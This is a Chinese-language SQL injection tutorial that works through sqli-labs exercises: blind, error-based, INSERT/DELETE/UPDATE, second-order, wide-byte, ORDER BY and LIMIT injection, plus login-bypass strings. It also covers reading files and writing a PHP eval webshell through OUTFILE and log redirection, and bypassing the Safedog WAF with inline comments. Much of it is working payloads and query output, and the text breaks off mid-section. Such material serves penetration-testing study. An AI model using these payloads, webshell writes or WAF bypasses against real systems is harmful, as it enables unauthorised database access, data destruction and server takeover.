盲注</h1>\n<p>盲注我这里只归纳为</p>\n<ol>\n<li>\n<p>时间盲注</p>\n</li>\n<li>\n<p>布尔盲注</p>\n</li>\n</ol>\n<p>其实在如今的实际环境中一般盲注的情况毕竟多，时间盲注太费时间 同时对网络要求比较高，二分，dnslog, 等等可以加快注入的进程。</p>\n<h1 id=\"0x01-盲注中值得注意的问题\"><a class=\"anchor\" href=\"#0x01-盲注中值得注意的问题\">#</a> 0x01 盲注中值得注意的问题</h1>\n<ol>\n<li>\n<p>盲注中使用 and 你得确定你查询的值得存在 。</p>\n</li>\n<li>\n<p>在返回多组数据的情况下，你的延时不再是 单纯的  <code>sleep(5)</code>  他将根据你返回的数据条数来反复执行</p>\n</li>\n<li>\n<p>在如同搜索型时尽量搜索存在且数目较少的关键词</p>\n</li>\n<li>\n<p>尽量不要使用 or</p>\n</li>\n</ol>\n<p>至于以上为什么会出现这种原因 推荐大家看看 这篇文章讲的很清楚 https://www.t00ls.net/thread-45590-1-10.html</p>\n<h1 id=\"0x02-简单时间盲注\"><a class=\"anchor\" href=\"#0x02-简单时间盲注\">#</a> 0x02 简单时间盲注</h1>\n<p>时间盲注也叫延时注入 一般用到函数  <code>sleep()</code>   <code>BENCHMARK()</code>  还可以使用笛卡尔积 (尽量不要使用，内容太多会很慢很慢), 查阅 mysql 手册会发现很多东西</p>\n<p>一般时间盲注我们还需要使用条件判断函数</p>\n<h2 id=\"if\"><a class=\"anchor\" href=\"#if\">#</a> if()</h2>\n<p><code>if（expre1，expre2，expre3）</code>  当 expre1 为 true 时，返回 expre2，false 时，返回 expre3<br />\n 盲注的同时也配合着 mysql 提供的分割函，与正则函数 like 函数，比较函数等等，还是那句话多看手册。</p>\n<pre><code>substr\nsubstring\nleft\n......\n\n</code></pre>\n<p>我们一般喜欢把分割的函数编码一下，当然不编码也行，编码的好处就是可以不用引号 常用到的就有  <code>ascii()</code>   <code>hex()</code>  等等<br />\n <code>benchmark()</code>  其作用是来测试一些函数的执行速度。benchmark () 中带有两个参数，第一个是执行的次数，第二个是要执行的函数或者是表达式。</p>\n<pre><code>mysql&gt; select * from users where id =1 and if((substr((select user()),1,1)='r'),sleep(5),1);\nEmpty set (5.01 sec)\n\nmysql&gt; select * from users where id =1 and if((substr((select user()),1,1)='r1'),sleep(5),1);\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | Dumb     | Dumb     |\n+----+----------+----------+\n1 row in set (0.00 sec)\n\nmysql&gt; select * from users where id =1 and if((substr((select user()),1,1)='r'),BENCHMARK(20000000,md5('a')),1);\nEmpty set (5.15 sec)\n\n</code></pre>\n<h2 id=\"case-when-then-else-end\"><a class=\"anchor\" href=\"#case-when-then-else-end\">#</a> case when then else end</h2>\n<pre><code>mysql&gt; select * from users where id =1 and case when (substr((select user()),1,1)=&quot;rr&quot;) then sleep(3) else 1 end;\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | Dumb     | Dumb     |\n+----+----------+----------+\n1 row in set (0.00 sec)\n\nmysql&gt; select * from users where id =1 and case when (substr((select user()),1,1)=&quot;r&quot;) then sleep(3) else 1 end;\nEmpty set (3.00 sec)\n\n</code></pre>\n<p>不推荐使用笛卡尔积当数据过多时会造成 DOS。</p>\n<h1 id=\"0x03-布尔盲注\"><a class=\"anchor\" href=\"#0x03-布尔盲注\">#</a> 0x03 布尔盲注</h1>\n<p>盲注思路的思路很多 比如正则匹配，比较函数，运算符，推荐大家可以看看<br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMTcwNjI2\"> https://www.anquanke.com/post/id/170626</span></p>\n<ol>\n<li>直接通过字符串截取对比，类似函数很多后面做个总结吧</li>\n</ol>\n<pre><code>http://127.0.0.1/sqli/Less-1/?id=1' and substr((select user()),1,1)='r' -- +\n</code></pre>\n<ol start=\"2\">\n<li>用  <code>IFNULL()</code>  函数</li>\n</ol>\n<pre><code>http://127.0.0.1/sqli/Less-1/?id=1' and IFNULL((substr((select user()),1,1)='r'),0) -- +\n\n</code></pre>\n<ol start=\"3\">\n<li>使用 比较函数 <code>strcmp()</code></li>\n</ol>\n<pre><code>1.\n\nhttp://127.0.0.1/sqli/Less-1/?id=1' and strcmp((substr((select user()),1,1)='r'),1) -- +\nhttp://127.0.0.1/sqli/Less-1/?id=1' and strcmp((substr((select user()),1,1)='r'),0) -- +\n\n\n2.\n\nmysql&gt; select * from users where id =1 and 0=strcmp((substr((select user()),1,1)),'o');\nEmpty set (0.00 sec)\n\nmysql&gt; select * from users where id =1 and 0=strcmp((substr((select user()),2,1)),'o');\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | Dumb     | Dumb     |\n+----+----------+----------+\n1 row in set (0.00 sec)\n\n\n</code></pre>\n<h1 id=\"0x04-小技巧\"><a class=\"anchor\" href=\"#0x04-小技巧\">#</a> 0x04 小技巧</h1>\n<p>在没有办法的情况下必须使用到 or 的延时注入不如试试子查询，他也只将延时 5s</p>\n<pre><code>http://192.168.130.135/Less-1/?id=1'  or if((substr((select user()),1,1)='r'),((select sleep(5) from information_schema.schemata as b)),1);-- +\n\n</code></pre>\n<h1 id=\"0x00-insertdeleteupdate-注入\"><a class=\"anchor\" href=\"#0x00-insertdeleteupdate-注入\">#</a> 0x00 insert,delete,update 注入</h1>\n<p>insert,delete,update 主要是用到盲注和报错注入，此类注入点不建议使用 sqlmap 等工具，会造成大量垃圾数据，和其他情况。</p>\n<h1 id=\"0x01-insertdeleteupdate\"><a class=\"anchor\" href=\"#0x01-insertdeleteupdate\">#</a> 0x01 insert,delete,update</h1>\n<h2 id=\"insert\"><a class=\"anchor\" href=\"#insert\">#</a> insert</h2>\n<p>可以看到假如没闭合是会产生很多垃圾数据的，所以这类注入建议手工或者自己写工具。</p>\n<p>一般这种注入会出现在 注册、ip 头、留言板等等需要写入数据的地方，同时这种注入不报错一般较难发现。</p>\n<ol>\n<li>报错</li>\n</ol>\n<pre><code>mysql&gt; insert into admin (id,username,password) values (2,&quot;or updatexml(1,concat(0x7e,(version())),0) or&quot;,&quot;admin&quot;);\nQuery OK, 1 row affected (0.00 sec)\n\nmysql&gt; select * from admin;\n+------+-----------------------------------------------+----------+\n| id   | username                                      | password |\n+------+-----------------------------------------------+----------+\n|    1 | admin                                         | admin    |\n|    1 | and 1=1                                       | admin    |\n|    2 | or updatexml(1,concat(0x7e,(version())),0) or | admin    |\n+------+-----------------------------------------------+----------+\n3 rows in set (0.00 sec)\n\nmysql&gt; insert into admin (id,username,password) values (2,&quot;&quot;or updatexml(1,concat(0x7e,(version())),0) or&quot;&quot;,&quot;admin&quot;);\nERROR 1105 (HY000): XPATH syntax error: '~5.5.53'\n\n</code></pre>\n<ol start=\"2\">\n<li>盲注</li>\n</ol>\n<p>int 型 可以使用 运算符 比如 加减乘除 and or 异或 移位等等</p>\n<pre><code>mysql&gt; insert into admin values (2+if((substr((select user()),1,1)='r'),sleep(5),1),'1',&quot;admin&quot;);\nQuery OK, 1 row affected (5.00 sec)\n\nmysql&gt; insert into admin values (2+if((substr((select user()),1,1)='p'),sleep(5),1),'1',&quot;admin&quot;);\nQuery OK, 1 row affected (0.00 sec)\n\n</code></pre>\n<p>字符型注意闭合不能使用 and</p>\n<pre><code>mysql&gt; insert into admin values (2,''+if((substr((select user()),1,1)='p'),sleep(5),1)+'',&quot;admin&quot;);\nQuery OK, 1 row affected (0.00 sec)\n\nmysql&gt; insert into admin values (2,''+if((substr((select user()),1,1)='r'),sleep(5),1)+'',&quot;admin&quot;);\nQuery OK, 1 row affected (5.01 sec)\n\n</code></pre>\n<p>注意盲注产生大量垃圾数据。</p>\n<h2 id=\"delete\"><a class=\"anchor\" href=\"#delete\">#</a> delete</h2>\n<p>报错注入同上</p>\n<p>值得注意的时 delete 注入很危险，很危险，很危险。</p>\n<p>语句不当 将会亲人泪两行  <code>or 1=1</code>  因为 1=1 为 true 所以每一行被删除了，他以前用 sqlmap 一把梭 现在过的很好，每顿都有人送饭到手上。</p>\n<p>所以在 delete 注入时使用 or 一定要为 false</p>\n<pre><code>mysql&gt; delete from admin where id =3 or 1=1;\nQuery OK, 4 rows affected (0.00 sec)\n\n</code></pre>\n<p>报错注入</p>\n<pre><code>mysql&gt; delete from admin where id =-2 or updatexml(1,concat(0x7e,(version())),0);\nERROR 1105 (HY000): XPATH syntax error: '~5.5.53'\n\n\n\n</code></pre>\n<p>盲注</p>\n<p>or 配上  <code>if()</code>  函数使用不当 再提下 if (expr1,expr2,expr3)，如果 expr1 的值为 true，返回 expr2 的值，如果 expr1 的值为 false，<br />\n返回 expr3 的值。</p>\n<pre><code>mysql&gt; delete from admin where id =-2 or if((substr((select user()),1,1)='r4'),sleep(5),1);\nQuery OK, 3 rows affected (0.00 sec)\n\n</code></pre>\n<p>所以 delete 中 or 的正确使用方法 (or 右边要为 false)</p>\n<pre><code>mysql&gt; delete from admin where id =-2 or if((substr((select user()),1,1)='r4'),sleep(5),0);\nQuery OK, 0 rows affected (0.00 sec)\n\nmysql&gt; delete from admin where id =-2 or if((substr((select user()),1,1)='r'),sleep(5),0);\nQuery OK, 0 rows affected (5.00 sec)\n\n</code></pre>\n<h2 id=\"update\"><a class=\"anchor\" href=\"#update\">#</a> update</h2>\n<p>与上面的类似</p>\n<pre><code>mysql&gt; select * from admin;\n+------+----------+----------+\n| id   | username | password |\n+------+----------+----------+\n|    2 | 1        | admin    |\n|    2 | 1        | admin    |\n|    2 | 1        | admin    |\n|    2 | admin    | admin    |\n+------+----------+----------+\n4 rows in set (0.00 sec)\n\nmysql&gt; update admin set id=&quot;5&quot;+sleep(5)+&quot;&quot; where id=2;\nQuery OK, 4 rows affected (20.00 sec)\nRows matched: 4  Changed: 4  Warnings: 0\n</code></pre>\n<h1 id=\"0x02-文末-2\"><a class=\"anchor\" href=\"#0x02-文末-2\">#</a> 0x02 文末</h1>\n<p>update，insert 注入怎么找，我们可以尝试性插入、引号、双引号、转义符 \\ 让语句不能正常执行，然后如果插入失败，更新失败，然后深入测试确定是否存在注入</p>\n<h1 id=\"0x00-二次注入\"><a class=\"anchor\" href=\"#0x00-二次注入\">#</a> 0x00 二次注入</h1>\n<p>二次注入的原理是 sql 语句没有被转义直接存入数据库，然后在被读取查询而导致的。</p>\n<p>二次注入在 php 种通常见于，插入时被 <code>addslashes()</code>   <code>get_magic_quotes_gpc</code>  等等转义，但是写入数据库时还是使用原来的数据，二次注入造成原因时多种多样的。</p>\n<p>在没有被单引号包裹的 sql 语句下，我们可以用 16 进制编码他，这样就不会带有单引号等。</p>\n<pre><code>mysql&gt; insert into admin (id,name,pass) values ('3',0x61646D696E27313131,'11');\nQuery OK, 1 row affected (0.00 sec)\n\nmysql&gt; select * from admin;\n+----+-----------+-------+\n| id | name      | pass  |\n+----+-----------+-------+\n|  1 | admin     | admin |\n|  2 | admin'111 | 11111 |\n|  3 | admin'111 | 11    |\n+----+-----------+-------+\n4 rows in set (0.00 sec)\n\n</code></pre>\n<p>想要具体了解这个 大家可以做做 sqli-labs 24 课，二次注入在没有源码的情况比较难发现，通常见于注册，</p>\n<h1 id=\"0x01-宽字节注入\"><a class=\"anchor\" href=\"#0x01-宽字节注入\">#</a> 0x01 宽字节注入</h1>\n<pre><code>1.没使用宽字节\n%27 -&gt; %5C%27\n\n2. 试用宽字节\n\n%df%27 -&gt; %df%5c%27 -&gt; 運'\n</code></pre>\n<ol>\n<li>\n<p>在我们输入单引号时  <code>addslashes()</code>  或者 <code>get_magic_quotes_gpc</code>  给我们的单引号加入了转义字符 <code>\\</code>  就变成了 <code>\\'</code></p>\n</li>\n<li>\n<p>我们输入经过转换后由于编码的不同把 <code>%df%5c</code>  转换为了一个汉字。</p>\n</li>\n</ol>\n<p>想要具体了解找个的可以 做做 sqli-labs 33 课</p>\n<h1 id=\"0x00-order-by-注入\"><a class=\"anchor\" href=\"#0x00-order-by-注入\">#</a> 0x00 order by 注入</h1>\n<p>这是一种特殊的注入 sql 语句为  <code>select * from admin order by $id</code>  我们一般用 order by 来判断他的列数，其实他就是一个依照第几个列来排序的过程。</p>\n<p>order by 注入是不能 直接使用 <code>and 1=1</code>  来判断的，他需要用到条件语句。</p>\n<pre><code>mysql&gt; select * from admin order by id;\n+------+----------+----------+\n| id   | username | password |\n+------+----------+----------+\n|    1 | cdmin    | bdmin    |\n|    2 | admin    | ddmin    |\n|    3 | bdmin    | fdmin    |\n+------+----------+----------+\n3 rows in set (0.00 sec)\n\nmysql&gt; select * from admin order by username;\n+------+----------+----------+\n| id   | username | password |\n+------+----------+----------+\n|    2 | admin    | ddmin    |\n|    3 | bdmin    | fdmin    |\n|    1 | cdmin    | bdmin    |\n+------+----------+----------+\n3 rows in set (0.00 sec)\n\n</code></pre>\n<h2 id=\"盲注\"><a class=\"anchor\" href=\"#盲注\">#</a> 盲注</h2>\n<ol>\n<li>布尔</li>\n</ol>\n<p>简单的判断</p>\n<pre><code>mysql&gt; select * from admin order by if(1=1,username,password);\n+------+----------+----------+\n| id   | username | password |\n+------+----------+----------+\n|    2 | admin    | ddmin    |\n|    3 | bdmin    | fdmin    |\n|    1 | cdmin    | bdmin    |\n+------+----------+----------+\n3 rows in set (0.00 sec)\n\nmysql&gt; select * from admin order by if(1=3,username,password);\n+------+----------+----------+\n| id   | username | password |\n+------+----------+----------+\n|    1 | cdmin    | bdmin    |\n|    2 | admin    | ddmin    |\n|    3 | bdmin    | fdmin    |\n+------+----------+----------+\n3 rows in set (0.00 sec)\n\n</code></pre>\n<p>简单的注入</p>\n<pre><code>mysql&gt; select * from admin order by if((substr((select user()),1,1)='r1'),username,password);\n+------+----------+----------+\n| id   | username | password |\n+------+----------+----------+\n|    1 | cdmin    | bdmin    |\n|    2 | admin    | ddmin    |\n|    3 | bdmin    | fdmin    |\n+------+----------+----------+\n3 rows in set (0.00 sec)\n\nmysql&gt; select * from admin order by if((substr((select user()),1,1)='r'),username,password);\n+------+----------+----------+\n| id   | username | password |\n+------+----------+----------+\n|    2 | admin    | ddmin    |\n|    3 | bdmin    | fdmin    |\n|    1 | cdmin    | bdmin    |\n+------+----------+----------+\n3 rows in set (0.00 sec)\n\n\nhttp://127.0.0.1/sqli/Less-46/?sort=if((substr((select user()),1,1)='r'),username,password)\n\n</code></pre>\n<ol start=\"2\">\n<li>时间盲注</li>\n</ol>\n<p>时间盲注不能直接简单的 <code>sleep()</code>  因为他会对每条内容来执行你的语句，所以会造成 dos 测试获取速度慢等问题，这时候我们需要用到子查询</p>\n<pre><code>mysql&gt; select * from admin order by if((substr((select user()),1,1)='r'),sleep(5),password);\n+------+----------+----------+\n| id   | username | password |\n+------+----------+----------+\n|    3 | bdmin    | fdmin    |\n|    2 | admin    | ddmin    |\n|    1 | cdmin    | bdmin    |\n+------+----------+----------+\n3 rows in set (15.01 sec)\n\n</code></pre>\n<p>我们写一条简单的子查询试试</p>\n<pre><code>mysql&gt; select * from admin order by if((substr((select user()),1,1)='r'),(select 1 from (select sleep(2)) as b),password);\n+------+----------+----------+\n| id   | username | password |\n+------+----------+----------+\n|    3 | bdmin    | fdmin    |\n|    2 | admin    | ddmin    |\n|    1 | cdmin    | bdmin    |\n+------+----------+----------+\n3 rows in set (2.01 sec)\n\n</code></pre>\n<h2 id=\"报错注入\"><a class=\"anchor\" href=\"#报错注入\">#</a> 报错注入</h2>\n<pre><code>http://127.0.0.1/sqli/Less-46/?sort=(extractvalue(1,concat(0x3a,version())),1)\n\nmysql&gt; select * from admin order by (extractvalue(1,concat(0x3a,version())),1);\nERROR 1105 (HY000): XPATH syntax error: ':5.5.53'\n\n</code></pre>\n<h1 id=\"0x01-from\"><a class=\"anchor\" href=\"#0x01-from\">#</a> 0x01 From</h1>\n<p>from 后面的注入比较少 还是提一下</p>\n<pre><code>select * from $id;\n\n</code></pre>\n<ol>\n<li>\n<p>可以结合 order by 来注入</p>\n</li>\n<li>\n<p>可以使用联合注入来注入</p>\n</li>\n</ol>\n<pre><code>mysql&gt; select * from admin union select 1,user(),3;\n+------+----------------+----------+\n| id   | username       | password |\n+------+----------------+----------+\n|    3 | bdmin          | fdmin    |\n|    2 | admin          | ddmin    |\n|    1 | cdmin          | bdmin    |\n|    1 | root@localhost | 3        |\n+------+----------------+----------+\n4 rows in set (0.02 sec)\n\n</code></pre>\n<p>方法跟普通注入一样的一样自己加上表名</p>\n<h1 id=\"0x02-limit\"><a class=\"anchor\" href=\"#0x02-limit\">#</a> 0x02 limit</h1>\n<p>这种注入也不是很常见，依照 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9yYXRlaXAuY29tL2Jsb2cvc3FsLWluamVjdGlvbnMtaW4tbXlzcWwtbGltaXQtY2xhdXNlLw==\">https://rateip.com/blog/sql-injections-in-mysql-limit-clause/</span> 来提一下</p>\n<pre><code>mysql&gt; select * from admin where id &gt;0 limit 0,1 $id\n\n</code></pre>\n<p>如何利用呢 大佬们已经给出方法了 用  <code>PROCEDURE ANALYSE</code>  配合报错注入，所以多看文档，如果你想提升下自己的水平</p>\n<pre><code>mysql&gt; select * from admin where id &gt;0 order by id limit 0,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);\nERROR 1105 (HY000): XPATH syntax error: ':5.5.53'\nERROR:\nNo query specified\n\n</code></pre>\n<p>这里延时只能使用 <code>BENCHMARK()</code>  如同</p>\n<pre><code>select * from admin where id &gt;0 order by id limit 0,1 PROCEDURE analyse(extractvalue(rand(),concat(0x3a,(if(1=1,benchmark(2000000,md5(404)),1)))),1);\n\n</code></pre>\n<h1 id=\"0x00-再谈万能密码登陆\"><a class=\"anchor\" href=\"#0x00-再谈万能密码登陆\">#</a> 0x00 再谈万能密码登陆</h1>\n<p>万能密码基本大家都用过，各种各样的，如下</p>\n<pre><code>'or 1=1/*\n&quot;or &quot;a&quot;=&quot;a\n&quot;or 1=1--\n&quot;or&quot;=&quot;\n&quot;or&quot;=&quot;a'='a\n&quot;or1=1--\n&quot;or=or&quot;\n''or'='or'\n') or ('a'='a\n'.).or.('.a.'='.a\n'or 1=1\n'or 1=1--\n'or 1=1/*\n'or&quot;=&quot;a'='a\n'or' '1'='1'\n'or''='\n'or''=''or''='\n'or'='1'\n'or'='or'\n'or.'a.'='a\n'or1=1--\n1'or'1'='1\na'or' 1=1--\na'or'1=1--\nor 'a'='a'\nor 1=1--\nor1=1--\n\n</code></pre>\n<p>其实根据前面的文章我们很容易看出 他的原理就是让我们的条件恒成立 至于为什么这么多种，就是根据语句的形势来闭合的，</p>\n<p>这里面涉及到运算符的优先级，MySQL 运算的特性，然后下面我们以几个例子来做做最另类的万能密码</p>\n<pre><code>mysql&gt; select * from admin where name = '/*' and pass = '*/';\nEmpty set (0.00 sec)\n\n</code></pre>\n<p>注释绕过</p>\n<pre><code>mysql&gt; select * from admin where name = ''or 1=1-- ' and pass = '123';\n    -&gt; ;\n+----+-----------+-------+\n| id | name      | pass  |\n+----+-----------+-------+\n|  1 | admin     | admin |\n|  2 | admin'111 | 11111 |\n|  3 | admin'111 | 11    |\n|  4 | admin'111 | 11    |\n+----+-----------+-------+\n4 rows in set (0.00 sec)\n\n</code></pre>\n<p>经典的 <code>or 1=1--</code>  其中 1=1 恒为 true 然后导致每条数据都成立返回</p>\n<p>那么知道了这个原理怎么构造一个简单的万能密码呢</p>\n<pre><code>mysql&gt; select ''=0\n    -&gt; ;\n+------+\n| ''=0 |\n+------+\n|    1 |\n+------+\n1 row in set (0.00 sec)\n\nmysql&gt; select 1=0=0;\n+-------+\n| 1=0=0 |\n+-------+\n|     1 |\n+-------+\n1 row in set (0.30 sec)\n\n</code></pre>\n<p>我们可以看到在 mysql 中 空字符串 '' 等于 0 为 1 也就是 true 知道这个特性我们可以来构造我们的万能密码了</p>\n<pre><code>mysql&gt; select * from admin where name = ''|0#'  and pass = '123';\n    -&gt; ;\n+----+-----------+-------+\n| id | name      | pass  |\n+----+-----------+-------+\n|  1 | admin     | admin |\n|  2 | admin'111 | 11111 |\n|  3 | admin'111 | 11    |\n|  4 | admin'111 | 11    |\n+----+-----------+-------+\n4 rows in set, 5 warnings (0.00 sec)\n\n</code></pre>\n<p>仅仅用了  <code>'|0#</code>  个字符就能达到我们的效果 其他方法大家还可以测试，因为是自己发现的，然后问了几个师傅 发现 ctf 已经别人都用过了 ，不得不承认自己的知识量远远不够。</p>\n<h1 id=\"0x00-读写文件与堆叠查询\"><a class=\"anchor\" href=\"#0x00-读写文件与堆叠查询\">#</a> 0x00 读写文件与堆叠查询</h1>\n<p>MySQL 中 在在 mysql 5.6.34 版本以后 secure_file_priv 的值默认为 NULL , 而 secure_file_priv 为 null 那么我们就不能导出文件，以下都建立在</p>\n<p>secure_file_priv 的默认值被修改为无才能利用，且这个只能手工修改配置文件不能用 sql 语句，也就是想直接导出需要管理员不知道干了什么帮你修改好这个权限才行。</p>\n<p>windows 系统在 my.ini 的 [mysqld] 下面加上 secure_file_priv = ，linux 的在 /etc/my.cnf 同时读写权限问题就不用说了。</p>\n<pre><code>mysql&gt; show global variables like '%secure%';\n+------------------+-------+\n| Variable_name    | Value |\n+------------------+-------+\n| secure_auth      | OFF   |\n| secure_file_priv |       |\n+------------------+-------+\n2 rows in set (0.00 sec)\n\n</code></pre>\n<h1 id=\"0x01-读文件\"><a class=\"anchor\" href=\"#0x01-读文件\">#</a> 0x01 读文件</h1>\n<p>可以把文件 hex 一下输出，文件名也是支持 hex 和 char 的</p>\n<pre><code>mysql&gt; select * from admin union select 1,hex(load_file('D:\\\\1.txt')),3;\n+------+------------------------+----------+\n| id   | username               | password |\n+------+------------------------+----------+\n|    3 | bdmin                  | fdmin    |\n|    2 | admin                  | ddmin    |\n|    1 | cdmin                  | bdmin    |\n|    1 | 617574686F72A3BA343034 | 3        |\n+------+------------------------+----------+\n4 rows in set (0.02 sec)\n\nhttp://127.0.0.1/sqli/Less-1/?id=-1' union select 1,hex(load_file(0x463A5C5C312E747874)),3-- +\n\n</code></pre>\n<p>当然你加入你进了 phpmyadmin 类似的平台 可以执行 sql 语句，你可以选择把导入的数据插入表中<br />\n同时支持导入的函数还有  <code>load data infile</code></p>\n<pre><code>create table test(test text);\ninsert into test(test) values (load_file('D:\\\\1.txt'));\nselect * from test;\n\n</code></pre>\n<p>如果能读文件在渗透测试中往往很有用，可以读取配置文件，系统问题等等关键信息，在我以前的一次意淫中，进入一个后台功能全被限制死了，但是可以执行导入，通过一个编辑器的目录遍历，发现某文件时间不一致，读取出来发现是 webshell，应该是某黑客进去之后做的手脚</p>\n<h1 id=\"0x02-写文件\"><a class=\"anchor\" href=\"#0x02-写文件\">#</a> 0x02 写文件</h1>\n<ol>\n<li></li>\n</ol>\n<p>写文件我们一般用到  <code>dumpfile</code>  与 <code>outfile</code>  她们其实是有区别</p>\n<p><code>outfile</code>  会在行末写入新行，而且会转义换行符</p>\n<p><code>dumpfile</code>  能导出一个完整的文件，不会有任何转义 所以我们 udf 提取一般用的 dumpfile</p>\n<pre><code>\nmysql&gt; select * from admin where id =1 union select 1,'&lt;?php eval($_POST[cmd]);?&gt;',3 into outfile 'G:\\\\test.txt';\nQuery OK, 2 rows affected (0.00 sec)\n\n</code></pre>\n<ol start=\"2\">\n<li></li>\n</ol>\n<p>后来大佬们找到一种方法通过日志来写 shell 解决这个史诗级难题，但是需要能直接执行 sql 语句利用有限</p>\n<pre><code>set global general_log=on;\nset global general_log_file='D://404.php';\nselect '&lt;?php eval($_POST['404']) ?&gt;';\n\n</code></pre>\n<p>通过把日志路径更改 ，让查询的日志保存过去，还有一种慢日志，原理一样</p>\n<pre><code>mysql&gt; show global variables like '%query_log%'\n    -&gt; ;\n+---------------------+-------------------------------------------------------------+\n| Variable_name       | Value                                                       |\n+---------------------+-------------------------------------------------------------+\n| slow_query_log      | OFF                                                         |\n| slow_query_log_file | D:\\phpstudy\\PHPTutorial\\MySQL\\data\\LAPTOP-M4APUKKN-slow.log |\n+---------------------+-------------------------------------------------------------+\n2 rows in set (0.00 sec)\n\n</code></pre>\n<pre><code>set global slow_query_log=1;\n\nset global slow_query_log_file='D://404.php'\n\nselect '&lt;?php eval($_POST['404']) ?&gt;' or sleep(15);\n\n</code></pre>\n<h1 id=\"0x03-堆叠查询\"><a class=\"anchor\" href=\"#0x03-堆叠查询\">#</a> 0x03 堆叠查询</h1>\n<p>mysql 是支持堆叠查询的用 <code>;</code>  分割语句，但是 php 原生的连接方式不支持，但是使用 PDO,mysqli_multi_query () 等等是支持多语句的，在我们使用堆叠查询的时候基本是没有回显的，而且其实很难遇到这种环境。</p>\n<pre><code>mysql&gt; select * from admin where id =1;select user();\n+------+----------+----------+\n| id   | username | password |\n+------+----------+----------+\n|    1 | cdmin    | bdmin    |\n+------+----------+----------+\n1 row in set (0.00 sec)\n\n+----------------+\n| user()         |\n+----------------+\n| root@localhost |\n+----------------+\n1 row in set (0.00 sec)\n\n</code></pre>\n<p>这里讲在一起就是因为，假如支持堆叠查询还可以用日志来写 shell。</p>\n<pre><code>\nhttp://192.168.59.129/Less-38/?id=1%27;set global general_log=on;set global general_log_file='C://phpstudy//404.php';--+\n\nhttp://192.168.59.129/Less-38/?id=1%27;select '&lt;?php eval($_POST[404]) ?&gt;';--+\n\n</code></pre>\n<h1 id=\"0x00-联合注入过狗\"><a class=\"anchor\" href=\"#0x00-联合注入过狗\">#</a> 0x00 联合注入过狗</h1>\n<p>其实我们过这些 waf 就是个正则的绕过，因为这种通用型的 waf，需要考虑到用户体验，他不能出现什么东西就直接拦截，比正则过滤的一些好绕一点，如何成功绕过我们需要具备对 mysql 各个函数、语法、特性的熟悉，然后通过不断的 fuzz 来测试出我们想要的 payload 的</p>\n<p>每个狗的版本不同，他的正则也是不同的所以有的 payload 在最新版可以用，在老版本就可能用不上，当你的知识量有一定的积累后，绕过 waf 或许就很简单，</p>\n<p>如何快速的提升自己的这些知识，多看文章，多看官方手册。</p>\n<h1 id=\"0x01-探索-and\"><a class=\"anchor\" href=\"#0x01-探索-and\">#</a> 0x01 探索 and</h1>\n<p>实验环境 ： win2003 apache 安全狗 4.0.23957</p>\n<p>首先我们来探索简单的语句  <code>and 1=1</code></p>\n<pre><code>and 1    拦截\nand '1'  拦截\nand a    不拦截\nand 'a'  拦截\nand !    不拦截\nand 1+1  拦截\nand 1+a  拦截\nand hex(1) 不拦截\n\n</code></pre>\n<p>通过测试我们发现当 and 后面跟上 数字型和字符型时他会给我们拦截掉 ，其实我们在安全狗的规则里面可以看到他拦截 and 和 or 所以我们有 2 个思路</p>\n<ol>\n<li>\n<p>用其他字符替换 and 或者 or</p>\n</li>\n<li>\n<p>带入的不是字符串和数字型，带入一个特殊符号</p>\n</li>\n</ol>\n<p>针对第一种我们可以去看看运算符号 随便找到几个 <code>| ^ xor &amp; / * &amp;&amp; ||</code>  等等还有很多</p>\n<pre><code>mysql&gt; select '1'|1;\n+-------+\n| '1'|1 |\n+-------+\n|     1 |\n+-------+\n1 row in set (0.00 sec)\n\n\nmysql&gt; select '1'&amp;1;\n+-------+\n| '1'&amp;1 |\n+-------+\n|     1 |\n+-------+\n1 row in set (0.00 sec)\n\nmysql&gt; select '1'^1;\n+-------+\n| '1'^1 |\n+-------+\n|     0 |\n+-------+\n1 row in set (0.00 sec)\n\n\n</code></pre>\n<p>知道这个了我们带入我们的语法就很简单了 通过运算符来改变 ID 的值 查看页面是否变化 这是可行的。</p>\n<pre><code>mysql&gt; select * from admin where id ='1'|2-- +';\n    -&gt; ;\n+------+----------+----------+\n| id   | username | password |\n+------+----------+----------+\n|    3 | bdmin    | fdmin    |\n+------+----------+----------+\n1 row in set (0.00 sec)\n\nmysql&gt; select * from admin where id ='1'|1-- +';\n    -&gt; ;\n+------+----------+----------+\n| id   | username | password |\n+------+----------+----------+\n|    1 | cdmin    | bdmin    |\n+------+----------+----------+\n1 row in set (0.00 sec)\n\n</code></pre>\n<p>经过测试你还会发现他的正则不全 <code>&amp;&amp; true</code>  也是可以的。</p>\n<p>那我们可以不可以正面刚 <code>and</code>   <code>or</code>  呢，当然也是可行的，前面我们测试过  <code>and hex(1)</code>  不拦截其实已经可以拿来判断了，但是我们还要深入的探究</p>\n<p><code>and hex(1)=</code>  也是不拦截的 但是后面加入字符型和数字型他又开始拦截，所以我们可以猜测 他判断 = 左右的字符类型，经过测试就能出来很多我们想要的</p>\n<pre><code>and ~1&gt;1\n\nand hex(1)&gt;-1\n\nand hex(1)&gt;~1\n\n</code></pre>\n<p>再深入探究 你就会发现 安全狗他只在乎 数字型的正数，而不在乎负数，也就是 <code>and -2&lt;-1</code>  就能过狗，也可能是 <code>-</code>  绕过了他的正则</p>\n<h1 id=\"0x02-探索-union-select\"><a class=\"anchor\" href=\"#0x02-探索-union-select\">#</a> 0x02 探索 union select</h1>\n<ol>\n<li>内联注释绕过</li>\n</ol>\n<pre><code>union    不拦截\nselect   不拦截\nunion select 拦截\nunion 各种字符 select 拦截\nunion/*select*/ 不拦截\n\n</code></pre>\n<p>通过简单的测试我们发现安全狗还是认识我们我们的注释的符号的，所以我们就需要通过这个来绕过我们的安全狗，前面符号一章我讲过注释符号的几种，我们主要使用的是</p>\n<p>内联注释  <code>/*!/*!*/</code></p>\n<pre><code>http://192.168.59.129/Less-1/?id=1' union/*!/*!50000select*/ 1,2,3--+  拦截\n\nhttp://192.168.59.129/Less-1/?id=1' union/*!/*!5select*/ 1,2,3--+  不拦截\n\n\n</code></pre>\n<p>为什么不拦截 ，因为 50000 是他的版本号，你多一位少一位语句是不能能正常执行的，所以他就放行了，那么我们可以用 burp 来遍历这个值呢，结果的确是我们想要的</p>\n<pre><code>http://192.168.59.129/Less-1/?id=1' union/*!/*!11440select*/ 1,2,3--+ 